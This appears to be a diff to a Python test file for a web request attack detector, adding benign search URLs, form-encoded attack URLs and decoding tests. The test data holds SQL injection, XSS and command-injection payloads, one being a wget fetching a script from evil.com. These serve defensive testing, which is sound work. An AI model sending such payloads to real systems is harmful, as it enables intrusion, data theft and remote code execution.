@@ -58,6 +58,18 @@ BENIGN_URLS = [
     "/robots.txt",
     "/health",
     "/api/items?sort=name&order=desc",
+    # Search terms as browsers send them, with '+' for each space
+    "/search?q=rock+and+roll",
+    "/search?q=salt+and+pepper+recipes",
+    "/search?q=O'Brien+and+Sons",
+    "/search?q=don't+drop+the+ball",
+    "/search?q=terms+and+conditions",
+    "/search?q=c%2B%2B+or+java",
+    "/search?q=cats+or+dogs&page=2",
+    "/search?q=it's+1+or+2+days",
+    "/search?q=update+my+settings",
+    "/search?q=what+is+1%2B1",
+    "/jobs?q=sales+%26+marketing",
 ]
 
 # Real payloads, including percent-encoded evasions.
@@ -82,6 +94,12 @@ ATTACK_URLS = [
     "/y?c=$(id)",
     "/z?cmd=|| wget http://evil.com/s.sh",
     "/a?f=;/bin/sh",
+    # Form-encoded: '+' is a space in a query string
+    "/login?u=admin'+OR+'1'='1",
+    "/login?u=admin'+--+",
+    "/p?id=1+UNION+SELECT+1,2",
+    "/p?id=1'+AND+1=1--+",
+    "/s?q=<img+src=x+onerror=alert(1)>",
 ]
 
 _SIGNATURES = [('SQLi', _SQLI), ('CmdI', _CMDI), ('XSS', _XSS), ('Traversal', _TRAVERSAL)]
@@ -129,6 +147,14 @@ class TestUrlDecoding:
     def test_is_bounded(self):
         """Decoding stops after two passes rather than looping on input."""
         assert _decode('%25252527') == '%2527'
+
+    def test_reads_plus_as_a_space(self):
+        assert _decode("admin'+OR+'1'='1") == "admin' OR '1'='1"
+
+    def test_encoded_plus_stays_a_plus(self):
+        """%2B is a literal plus; the second pass must not turn it into a space."""
+        assert _decode('c%2B%2B') == 'c++'
+        assert _decode('1%252B1') == '1+1'
 
     def test_leaves_plain_paths_alone(self):
         assert _decode('/index.html') == '/index.html'
